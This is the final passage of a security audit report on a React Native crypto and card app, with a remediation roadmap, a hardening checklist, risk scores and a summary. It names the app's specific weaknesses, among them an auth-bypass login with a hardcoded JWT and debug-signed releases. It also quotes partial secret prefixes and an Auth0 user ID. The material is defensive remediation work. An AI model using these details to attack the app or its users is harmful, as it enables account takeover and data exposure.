| Transaction signing / non-repudiation | ❌ None — no request signing |
| Anti-tampering / RASP | ❌ None |
| Device binding | ❌ None |
| Fraud signals to backend | ❌ None (and the IP header is spoofable) |
| Secure SDLC | ❌ No CI, no tests, no lint, no secret scanning |
| Incident detection | ❌ Error reporting disabled |
| Key management | ❌ Keys in source; signing key in repo |

---

## 15. Recommendations & Remediation Roadmap

### 15.1 Immediate Fixes (0–72 hours)

These are containment actions. Complete them before any further development.

| # | Action | Finding |
|---|---|---|
| 1 | **Rotate the Kommo secret** `60d0c569…` and treat all support conversations as potentially exposed | [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript) |
| 2 | **Revoke the Sentry auth token** `sntrys_…`; audit its usage log since 2025-10-25 | [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository) |
| 3 | **Revoke the Auth0 session** for `auth0\|adcbc03f-bf36-4327-b11b-8c9235d5fbb6` and delete `onTempLoginPress` | [C-04](#c-04--hardcoded-production-issuer-jwt-and-authentication-bypass-fallback) |
| 4 | **Generate a real release keystore**; store it in a secrets manager; stop all releases until it is in use | [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore) |
| 5 | **Treat every previously distributed APK as compromised**; plan a forced update once a properly signed build exists | [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore) |
| 6 | **Remove `token` and request/response bodies from Crashlytics and Sentry**; purge existing telemetry data | [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics) |
| 7 | **Determine whether real customer KYC data is in the test environment**; if so, engage your DPO — this may be notifiable | [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build) |
| 8 | **Purge secrets from git history** (BFG / `git filter-repo`); force-push; have all contributors re-clone | [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript), [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository), [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore) |
| 9 | **Enable GitHub push protection** and add a `gitleaks` pre-commit hook | [CI-05](#133-findings) |
| 10 | **Audit the Auth0 tenant**: disable ROPC on all clients, verify PKCE-required, delete the unknown US-tenant client | [H-13](#h-13--hardcoded-auth0-client-ids-and-a-dead-password-grant-login-screen) |
| 11 | **Delete dead security-relevant code**: `Login.tsx`, `utils/auth.tsx`, `encryptForRegister` | [L-01](#l-01--dead-code-and-abandoned-modules), [C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption), [H-07](#h-07--auth-tokens-also-written-to-plaintext-asyncstorage) |

### 15.2 High Priority (1–4 weeks)

| # | Action | Finding | Effort |
|---|---|---|---|
| 12 | Fix `getAllEnvData`; introduce build-time environment selection (`react-native-config` + Android flavours + iOS configurations) | [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build) | L |
| 13 | Enable R8 with a complete keeps file; test the release build end-to-end | [C-08](#c-08--proguardr8-disabled-no-code-obfuscation) | L |
| 14 | Wire in `android:networkSecurityConfig`; add SPKI pinning on both platforms with backup pins | [H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest), [H-03](#h-03--no-certificate-pinning-on-either-platform) | M |
| 15 | Harden all Keychain writes (`THIS_DEVICE_ONLY`, `BIOMETRY_CURRENT_SET`, `SECURE_HARDWARE`) | [H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding) | M |
| 16 | Stop persisting tokens in Redux; narrow the whitelist; re-enable encryption; replace the unmaintained storage adapter | [H-05](#h-05--redux-persist-encryption-transform-is-disabled) | M |
| 17 | Add `FLAG_SECURE` (Android) and snapshot blurring + capture detection (iOS) | [H-09](#h-09--no-screenshot--screen-recording-protection) | S |
| 18 | Fix the WebView: origin allow-list, `onShouldStartLoadWithRequest`, never send the token to a dynamic URL | [H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow) | M |
| 19 | Raise PBKDF2 to 600,000 iterations (coordinate the wire format with the backend) | [H-01](#h-01--pbkdf2-with-10-iterations-protecting-password-changes) | S |
| 20 | Restore CI with blocking gates: `npm ci`, `npm audit --audit-level=high`, secret scan, config assertions | [§13](#13-devops--cicd-security) | M |
| 21 | Move signing into CI; enrol in Play App Signing; publish to Internal Testing, not public Releases | [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore) | M |
| 22 | Fix `validateCryptoAddress` — it currently validates only TRC-20 and Polygon | [L-09](#l-09--miscellaneous-observations) | S |
| 23 | Add inactivity lock + biometric step-up before PAN/PIN reveal and withdrawal | [M-15](#m-15--no-session-inactivity-timeout-or-foreground-re-authentication), [H-14](#h-14--biometric-gate-is-client-side-navigation-only) | M |
| 24 | Fix `NSPrivacyCollectedDataTypes`; set `aps-environment: production`; verify the iOS Auth0 callback | [§9](#9-ios-security-review) | S |
| 25 | Re-enable Sentry with replay off, PII off, and a shared scrubber | [M-12](#m-12--production-error-reporting-effectively-disabled), [H-08](#h-08--sentry-session-replay-and-pii-collection-enabled) | S |
| 26 | Replace `react-native-phone-number-input`; run `npm audit fix` | [H-12](#h-12--21-known-dependency-vulnerabilities-11-high-severity) | M |

### 15.3 Medium Priority (1–3 months)

| # | Action | Finding |
|---|---|---|
| 27 | Implement Play Integrity (Android) + App Attest (iOS) with **server-side** verdict verification | [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation) |
| 28 | Migrate AES-CBC → AES-256-GCM; instrument and then remove the zero-IV legacy path | [H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback) |
| 29 | Signature-based biometrics (`createSignature`) with server verification | [H-14](#h-14--biometric-gate-is-client-side-navigation-only) |
| 30 | Server-side enforcement of KYC/role/account-state on every financial endpoint | [VAPT-01](#vapt-01--authentication-bypass), [VAPT-02](#vapt-02--authorisation-bypass--privilege-escalation) |
| 31 | Random UUID idempotency keys; verify server-side enforcement | [M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs) |
| 32 | Add timeouts + retry policy; consolidate onto one HTTP client | [M-03](#m-03--no-request-timeouts-or-retry-policy) |
| 33 | Move Kommo signing server-side; delete `chatService.js` from the client | [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript) |
| 34 | Fix push-notification path handling; validate all notification-derived input | [M-05](#m-05--push-notification-body-used-directly-as-a-file-path) |
| 35 | Move downloads to private storage; use SAF for user-initiated exports | [M-07](#m-07--financial-documents-written-to-world-readable-public-storage) |
| 36 | Trim permissions; add `maxSdkVersion` bounds and `dataExtractionRules` | [M-06](#m-06--over-broad-android-permissions) |
| 37 | Add ESLint config; fix TS errors; make both blocking | [L-06](#l-06--no-eslint-configuration-despite-a-lint-script), [L-07](#l-07--typescript-strictness-not-enforced) |
| 38 | Fix Jest config; add risk-prioritised tests (crypto, money math, address validation, idempotency) | [L-05](#l-05--minimal-test-coverage) |
| 39 | Strip `console.*` from release; introduce a scrubbed logger | [M-16](#m-16--excessive-console-logging-across-20-files) |
| 40 | Remove the 11 redundant dependencies; drop Jetifier | [L-02](#l-02--duplicated-and-redundant-dependencies) |
| 41 | Lazy-load screens; add FlatList tuning; ship `.aab` | [P-01](#p-01--all-120-screens-statically-imported-at-startup), [P-02](#p-02--no-flatlist-virtualisation-tuning), [P-04](#p-04--bundle-bloat-from-redundant-libraries) |
| 42 | Remove the client-asserted IP header; derive geo server-side | [M-10](#m-10--third-party-ip-geolocation-call-with-inverted-connectivity-logic) |

### 15.4 Architecture Improvements (3–6 months)

| # | Action |
|---|---|
| 43 | Consolidate onto RTK; delete the legacy `src/redux/` store and reducer |
| 44 | Extract a domain layer for fees, limits, validation, and KYC rules — pure and unit-tested |
| 45 | Deduplicate: one logout hook, one error formatter, one crypto module, one storage abstraction, one HTTP client |
| 46 | Split the 2,000-line screens into containers + presentational components |
| 47 | Standardise naming; fix the misspellings in one mechanical PR |
| 48 | Introduce a query cache (React Query / RTK Query) for dedup, caching, and background refresh |
| 49 | Evaluate a commercial RASP layer for a fintech risk profile |
| 50 | Add request signing for high-value operations |
| 51 | Commission an external penetration test once items 1–42 are complete |

### 15.5 Production Hardening Checklist

**Build & release**
- [ ] Release keystore generated, stored in a secrets manager, never on a workstation
- [ ] `signingConfigs.release` used for release builds
- [ ] Enrolled in Play App Signing
- [ ] R8 enabled with tested keeps; `shrinkResources` on
- [ ] JS bundle minified with identifier mangling
- [ ] Mapping files and dSYMs uploaded to the crash reporter
- [ ] `.aab` published; x86 ABIs excluded
- [ ] Signing performed only in CI

**Configuration**
- [ ] `getAllEnvData` honours its parameter; `APP_ENV` injected at build time
- [ ] Android product flavours + iOS build configurations for dev/tst/prod
- [ ] Per-environment Firebase config, Auth0 tenant, and API base URL
- [ ] CI assertion that a production build does not resolve to a dev/tst URL
- [ ] Non-production builds visibly watermarked

**Network**
- [ ] `android:networkSecurityConfig` declared and verified against a proxy CA
- [ ] SPKI pinning on both platforms with at least one backup pin and an expiry
- [ ] `NSAllowsLocalNetworking` removed from Release
- [ ] Timeouts on every client; retry only for idempotent operations
- [ ] One consolidated HTTP client

**Storage & crypto**
- [ ] All Keychain writes use `THIS_DEVICE_ONLY` + `BIOMETRY_CURRENT_SET` + `SECURE_HARDWARE`
- [ ] Tokens not duplicated into Redux; persist whitelist narrowed
- [ ] redux-persist encryption enabled with a dedicated key
- [ ] AES-256-GCM in use; zero-IV fallback removed
- [ ] PBKDF2 ≥ 600,000 iterations (or Argon2id)
- [ ] No secrets in source; secret scanning in CI and pre-commit
- [ ] Documents written to private storage

**Authentication & session**
- [ ] `onTempLoginPress` deleted; all failure paths fail closed
- [ ] ROPC disabled on all Auth0 clients
- [ ] Signature-based biometrics with server verification
- [ ] Inactivity lock + absolute session lifetime
- [ ] Step-up authentication before PAN/PIN reveal and withdrawal
- [ ] Refresh-token rotation with reuse detection enabled
- [ ] Revocation honoured immediately

**Runtime protection**
- [ ] Play Integrity / App Attest verified server-side
- [ ] Root/jailbreak detection feeding backend risk signals
- [ ] `FLAG_SECURE` (Android) and snapshot blurring (iOS)
- [ ] WebView origin-restricted; token never sent to a dynamic URL

**Privacy & telemetry**
- [ ] No tokens or request/response bodies in any telemetry
- [ ] Session replay disabled (or fully masked and DPIA'd)
- [ ] `sendDefaultPii: false`
- [ ] Consent gate before analytics/crash collection
- [ ] `NSPrivacyCollectedDataTypes` accurate
- [ ] Third-party processors declared with DPAs in place

**Process**
- [ ] CI restored with blocking gates (audit, typecheck, test, lint, secret scan, config assertions)
- [ ] Branch protection on `main`
- [ ] SBOM generated per release
- [ ] Dependabot/Renovate active
- [ ] `SECURITY.md` with a disclosure process
- [ ] External penetration test completed

---

## 16. Final Scoring

### 16.1 Scores

| Dimension | Score | Rationale |
|---|---|---|
| **Security** | **2.0 / 10** | 8 Critical and 15 High findings. Live secrets in the shipped bundle, a public signing key, a hardcoded JWT with an auth-bypass fallback, and bearer tokens exported to third-party telemetry. The two points reflect genuinely correct choices — Keychain over AsyncStorage for tokens, `allowBackup=false`, ATS arbitrary loads disabled, Auth0 PKCE, and a random-IV encryption scheme with a versioned wire format. |
| **Performance** | **5.5 / 10** | Solid foundations: Hermes, New Architecture, Reanimated 4, native crypto, and a well-reasoned decrypt cache. Undermined by ~120 eagerly-imported screens, three charting libraries, two date libraries, zero FlatList tuning, and five `useMemo` calls across 53k LOC. |
| **Maintainability** | **4.0 / 10** | Good service-layer separation, feature-based structure, and genuinely excellent documentation in the crypto and build-tooling code. Offset by two parallel state systems, five duplicate logout implementations, 1,081 `any` annotations, no lint config, one failing test, nine dead modules, and pervasive misspellings. |
| **Mobile Security (MASVS)** | **1.5 / 10** | MASVS-L1 not met in any control group; L2 — the appropriate bar for a custodial crypto and card platform — not approached. No binary protection, no attestation, no pinning, no anti-tampering. |
| **DevSecOps** | **1.0 / 10** | CI/CD deleted in the head commit. No automated gate of any kind. Signing key in the repository. Five secrets committed. Releases were distributed debug-signed. |
| **API Security** | **3.5 / 10** | Correct token-injection interceptor, sensible centralised error mapping, API versioning, and working refresh-token rotation. But no pinning, no timeouts, no retry policy, client-side-only authorisation, weak idempotency, and nine scattered clients. |
| **Compliance Readiness** | **1.5 / 10** | 0/10 OWASP Mobile Top 10 passing. Multiple PCI-DSS failures on a card-displaying app. Likely GDPR incidents already in progress (test-environment KYC data, committed Sentry token). |

### 16.2 Overall Risk Rating

> # 🔴 CRITICAL
>
> **Recommendation: Do not release. Freeze feature development until §15.1 and §15.2 are complete.**

**Composite score: 2.7 / 10**

### 16.3 Assessment Summary

**The core problem is not competence — it is the absence of a security process.**

This codebase contains work that is, in places, better than what this audit's scores suggest. The `crypto-js` → `react-native-quick-crypto` migration is carefully done, byte-compatible, documented, and verified. The decrypt memoisation cache reasons correctly about determinism, key-scoping, and why encryption must *not* be cached. The RN 0.83 upgrade notes, the CMake/NDK pinning rationale, and the `.gitignore` comment explaining why the lockfile is tracked all demonstrate engineers who think about consequences. The network security config is correctly written. The deleted CI pipeline was well-structured and honest about its own gaps.

The failures are almost entirely of a different kind: **things that were started and not finished, or that no automated gate ever checked.**

- The encryption transform was written correctly, then commented out "temporarily."
- The network security config was written correctly, then never referenced in the manifest.
- The release build type carries the RN template's own warning comment about the debug keystore, unheeded.
- The deleted release workflow *printed a warning about debug signing in its own changelog*.
- The CI workflow documented exactly why typecheck, test, and lint were non-blocking — and then the whole pipeline was deleted three days later.
- A "temporary login" with a real JWT was added for testing and never removed.

Every one of these would have been caught by a gate: a secret scanner, a blocking lint rule, a config assertion in CI, a release checklist. The single highest-leverage investment is not any individual fix in this report — it is **restoring CI and making it blocking**, so that the next "temporary" shortcut cannot reach a release build.

**The three things that matter most, in order:**

1. **Rotate every exposed credential and generate a real signing key.** Until the debug keystore is replaced, anyone can ship a signed build of this app. Nothing else in this report matters as much.
2. **Fix `getAllEnvData`.** Every build currently targets the test environment. Real customer KYC data may already be sitting in a test-tier system — determine this today, because it may be a notifiable breach with a 72-hour clock.
3. **Stop logging bearer tokens.** One line in [ApiService.ts:87](src/utils/ApiService.ts#L87) is exporting live session credentials to two third-party processors on every API error.

With the §15.1 containment actions and the §15.2 high-priority work complete, this application would move from **Critical** to approximately **Medium** risk. Reaching a posture appropriate for a regulated custodial crypto and card issuer — MASVS-L2, server-side attestation, RASP, and an external penetration test — is realistically a two-to-three-quarter programme, and should be planned as one rather than attempted as a sprint.

---

*Report generated 2026-08-03 · Branch `rn-0.83-upgrade` @ `5f38f42` · Static analysis and configuration review. Backend authorisation, server-side rate limiting, and Auth0 tenant configuration could not be verified from the client codebase and are flagged throughout as requiring separate confirmation. This report does not substitute for a dynamic penetration test against a running instance.*
